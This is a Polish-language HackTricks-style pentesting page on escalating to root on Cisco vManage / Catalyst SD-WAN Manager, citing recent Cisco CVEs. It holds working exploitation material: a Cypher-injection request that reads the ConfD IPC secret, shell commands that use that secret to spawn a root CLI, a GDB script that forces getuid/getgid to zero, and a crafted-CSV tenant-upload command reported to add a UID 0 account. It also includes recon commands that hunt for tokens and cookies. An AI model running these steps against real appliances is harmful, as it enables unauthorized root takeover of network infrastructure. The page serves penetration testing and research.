# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Po uzyskaniu code execution na Cisco vManage / *Catalyst SD-WAN Manager* jako `vmanage`, `netadmin` lub `vmanage-admin`, najciekawszymi lokalnymi powierzchniami privesc są zwykle stos `confd` CLI, helper `cmdptywrapper`, lokalne REST API oraz handlery importu/uploadu działające z uprawnieniami roota.

Jeśli nadal potrzebujesz **initial foothold** na kontrolerze, najpierw sprawdź dedykowaną stronę control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Szybki lokalny triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Jeśli `/etc/confd/confd_ipc_secret` jest dostępny do odczytu z Twojego foothold, Path 1 i Path 2 stają się natychmiast praktyczne. Jeśli uzyskasz dostęp przez remote file disclosure lub webshell, sprawdź również materiały SSH `vmanage-admin` oraz handlery uploadu w multitenancy; niedawne badania wykazały, że oba rozwiązania mogą służyć jako pivots.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Ocena vManage przeprowadzona przez Synacktiv opisuje tę ścieżkę do powłoki roota.<sup>[[5]](#references)</sup>

[Dokumentacja ConfD](http://66.218.245.39/doc/html/rn03re18.html) powiązana z raportem opisuje uwierzytelnianie IPC; przykład vManage umieszcza sekret w `/etc/confd/confd_ipc_secret` i pokazuje, że jest on dostępny do odczytu dla `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Ponieważ Neo4j działa z uprawnieniami `vmanage` w opisanej konfiguracji, wcześniejszy Cypher injection może odczytać tajny plik.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` samo nie przyjmuje argumentów wiersza poleceń; wywołuje `/usr/bin/confd_cli_user`. Opisany workflow wyodrębnia ten helper możliwy do odczytu przez root z rootfs, kopiuje go za pomocą `scp`, odczytuje jego help, ustawia `CONFD_IPC_ACCESS_FILE` i wywołuje go z `-U 0 -G 0`, aby uzyskać powłokę root.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ścieżka 2

Ta alternatywna ścieżka została zaadaptowana na podstawie badań Walmart Global Tech dotyczących vManage 19.2.2.<sup>[[6]](#references)</sup>

Ścieżka Synacktiv wymaga kopii `/usr/bin/confd_cli_user`, która w zgłoszonej konfiguracji jest dostępna do odczytu dla użytkownika root; raport Walmart zamiast tego modyfikuje wartości tożsamości `confd_cli` w GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Z disassembly zawartego w raporcie wynika, że `confd_cli` pobiera UID i GID wywołującego.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump pokazujący pobieranie UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Ten sam test wykazał, że należący do użytkownika root `cmdptywrapper` otrzymuje jawnie określone wartości `-g` i `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Badacz wywnioskował, że `confd_cli` przekazuje UID i GID zalogowanego użytkownika do `cmdptywrapper`.<sup>[[6]](#references)</sup>

Bezpośrednie uruchomienie `cmdptywrapper` z opcjami `-g 0 -u 0` nie powiodło się, ponieważ wymagany deskryptor pliku (`-i 1015` w przykładzie) nie był dostępny.<sup>[[6]](#references)</sup>

Ponieważ `confd_cli` nie udostępnia tych wartości jako argumentów, w raporcie użyto GDB do nadpisania wartości zwracanych przez `getuid()` i `getgid()`; GDB był dostępny na tym urządzeniu.<sup>[[5]](#references)[[6]](#references)</sup>

Mając dostęp do `vmanage`, test mógł odczytać `/etc/confd/confd_ipc_secret`; poniższy skrypt wymusza zwracanie zera przez oba wywołania identyfikatorów.<sup>[[6]](#references)</sup>

Skrypt GDB użyty w raporcie to:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Zgłoszone dane wyjściowe konsoli to:<sup>[[6]](#references)</sup>

<details>
<summary>Dane wyjściowe konsoli</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Ścieżka 3 (błąd walidacji danych wejściowych CLI z 2025 r. - CVE-2025-20122)

Cisco później opisało prostszą lokalną ścieżkę do root w swoim biuletynie dotyczącym [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). **Uwierzytelniony attacker posiadający wyłącznie uprawnienia read-only** mógł wysłać spreparowane żądanie do CLI managera i uzyskać root z powodu niewystarczającej walidacji danych wejściowych.<sup>[[7]](#references)</sup>

Z ofensywnego punktu widzenia ten biuletyn oraz wcześniejsze badania CLI sugerują następujący workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Gdy uzyskasz *jakikolwiek* low-priv foothold na hoście, przed rozpoczęciem bardziej rozbudowanego workflow Path 1 / Path 2 przetestuj lokalny serwis CLI.
2. Wykorzystaj ponownie artefakty z Path 2, aby znaleźć granicę zaufania: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Traktuj każde pole przekazywane do backendu CLI jako podejrzane: UID/GID, username, metadane terminala, importowane pliki lub dowolną wartość później przetwarzaną przez helpera działającego jako root.
4. Jeśli użytkownik low-priv może uzyskać dostęp do lokalnego socketu CLI i wpływać na te pola, do uzyskania root może wystarczyć jedno spreparowane żądanie.

Po uzyskaniu dostępu do appliance przeanalizuj lokalny łańcuch CLI w następujący sposób.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
To przekształca błąd z 2025 roku w powtarzalny wzorzec huntingu: szukaj **lokalnych CLI shimów, które zbierają informacje o tożsamości w userlandzie i przekazują je do uprzywilejowanego wrappera**.<sup>[[6]](#references)[[7]](#references)</sup>

Nie myl **CVE-2025-20122** z późniejszym **CVE-2026-20122**: problem z 2025 roku to *lokalny* błąd CLI-to-root, natomiast problem z 2026 roku to *zdalne* nadpisywanie dowolnych plików przez API, które jest głównie przydatne do uzyskania footholda, a następnie powrotu do Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 REST API z niskimi uprawnieniami do root - CVE-2026-20126)

Lutowy advisory Cisco z 2026 roku opisuje kolejną przydatną klasę privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). **Uwierzytelniony lokalny attacker z niskimi uprawnieniami** mógł uzyskać root z powodu niewystarczającego mechanizmu uwierzytelniania użytkownika w REST API.<sup>[[1]](#references)</sup>

Ma to znaczenie, ponieważ privesc w vManage nie ogranicza się już do nadużywania `confd`/TTY; po uzyskaniu shell jako użytkownik z niskimi uprawnieniami szukaj również poniższych elementów.<sup>[[1]](#references)</sup>

- endpointów API dostępnych wyłącznie przez localhost, które zbytnio ufają callerowi
- tokenów, cookies lub danych uwierzytelniających usług, które można odczytać z bieżącego konta
- akcji dostępnych wyłącznie dla root, udostępnionych przez handlery `dataservice`/REST, które nadal można lokalnie wywołać

W praktyce, gdy uzyskasz shell jako `vmanage` lub inny użytkownik usługi, nadużywanie lokalnego API może być łatwiejsze do zautomatyzowania niż interaktywne nadużywanie CLI.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Jeśli lokalny kontekst sesji wystarcza do uzyskania dostępu do uprzywilejowanych funkcji REST, preferuj ścieżkę API: łatwiej ją odtwarzać, skryptować i łączyć ze skradzionymi sesjami webowymi lub tokenami API.<sup>[[1]](#references)</sup>

## Ścieżka 5 (plik spreparowany w 2026 r. przetwarzany przez root - CVE-2026-20245)

Innym niedawnym wzorcem jest [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Lokalny attacker z uprawnieniami `netadmin` mógł przesłać **spreparowany plik**, który następnie był niebezpiecznie obsługiwany przez CLI, prowadząc do command injection jako `root`.<sup>[[2]](#references)</sup>

Z punktu widzenia HackTricks cenna technika wykracza poza konkretne CVE.<sup>[[2]](#references)</sup>

1. Wylicz każdą procedurę CLI lub webową, która akceptuje plik: importy, pakiety diagnostyczne, szablony, walidatory, backupy, dane tenantów itp.
2. Prześledź, gdzie trafia przesłany plik oraz który skrypt lub plik binarny należący do `root` go przetwarza.
3. Sprawdź, czy nazwa pliku, jego zawartość lub sparsowane metadane są kiedykolwiek przekazywane do poleceń powłoki, skryptów wrapperów albo helperów w stylu `system()`.
4. Jeśli możesz już uzyskać dostęp do `netadmin` (prawidłowe dane uwierzytelniające, skradziona sesja lub łańcuch auth-bypass), błędy w przetwarzaniu plików często stanowią najszybszą drogę do `root`.

Google Cloud / Mandiant później pokazali konkretny przypadek wykorzystywania tej klasy błędów za pośrednictwem ścieżki importu multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
W zaobserwowanym ataku spreparowany plik CSV zmodyfikował `/etc/passwd` i `/etc/shadow`, aby utworzyć tymczasowe konto z UID 0 (`troot`). To sprawia, że importery w stylu `tenant-upload` / `tenant-list` są szczególnie interesujące: nie są tylko funkcjami ingestii danych, lecz potencjalnymi front-endami parserów uruchamianymi z uprawnieniami właściciela root.<sup>[[4]](#references)</sup>

Szybki wzorzec wyszukiwania po stronie shell to:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ta klasa błędów szczególnie dobrze łączy się ze zdalnymi footholdami, które zapewniają `netadmin`, ale nie `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Inne niedawne podatności vManage/Catalyst SD-WAN Manager do połączenia

- **Nieuwierzytelniony info leak (CVE-2026-20133)** – Szczególnie cenny, ponieważ publiczne badania wykazały, że może ujawnić `confd_ipc_secret` lub klucz prywatny `vmanage-admin`, zmieniając błąd odczytu w Path 1 albo pivot NETCONF.<sup>[[3]](#references)</sup>
- **Uwierzytelnione dowolne nadpisanie pliku przez API (CVE-2026-20122)** – Różni się od opisanego wyżej błędu CLI z 2025 roku; VulnCheck wykorzystał go do przesłania webshella, przez co lokalne ścieżki privesc opisane na tej stronie stają się natychmiast istotne.<sup>[[3]](#references)</sup>
- **Uwierzytelniony XSS w UI (CVE-2024-20475)** – Uwierzytelniony atakujący może wykonać skrypt w interfejsie webowym zaatakowanego użytkownika; należy ocenić, czy wynikowy kontekst sesji udostępnia działania API/CLI prowadzące do `vshell` lub jednej z opisanych wyżej lokalnych ścieżek privesc.<sup>[[9]](#references)</sup>
- **Zdalne ominięcie uwierzytelniania do `netadmin` (CVE-2026-20129)** – Bardzo silny prekursor dla Path 5, ponieważ `netadmin` jest dokładnie poziomem wymaganym przez privesc z użyciem spreparowanego pliku z 2026 roku.<sup>[[2]](#references)[[3]](#references)</sup>
- **Uwierzytelniony dowolny zapis pliku (CVE-2026-20262)** – Ma podobną wartość ofensywną do CVE-2026-20122, ale wykorzystuje późniejszą ścieżkę uploadu w webowym UI; Cisco twierdzi, że plik utworzony lub nadpisany przez ten błąd może następnie posłużyć do uzyskania uprawnień `root`.<sup>[[10]](#references)</sup>
- **Downgrade w celu reaktywowania starego privesc w CLI (CVE-2022-20775)** – Intruzje z 2026 roku wykazały, że atakujący mogą wycofać system do starszego podatnego buildu SD-WAN, wykorzystać stary błąd uzyskania `root` przez CLI, a następnie przywrócić pierwotną wersję.<sup>[[8]](#references)</sup>
- **Ominięcie uwierzytelniania control plane przed uwierzytelnieniem (CVE-2026-20182)** – Zostało lepiej opisane na dedykowanej stronie dotyczącej control plane SD-WAN; może dodać klucz SSH dla `vmanage-admin`, zapewniając trwały dostęp NETCONF do dalszych działań w management plane.<sup>[[11]](#references)</sup>



## References

- [1] [Podatności Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129 itd.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Podatność eskalacji uprawnień po uwierzytelnieniu w Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager i Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats — niedawne podatności Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: wykorzystanie zero-day podatności (CVE-2026-20245) w Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN, część 1: atakowanie vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — od CSRF do Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Podatność eskalacji uprawnień w Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Aktywne wykorzystywanie Cisco Catalyst SD-WAN przez UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Podatność Cross-Site Scripting w Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Podatność dowolnego zapisu pliku w Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 — krytyczne ominięcie uwierzytelniania w Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
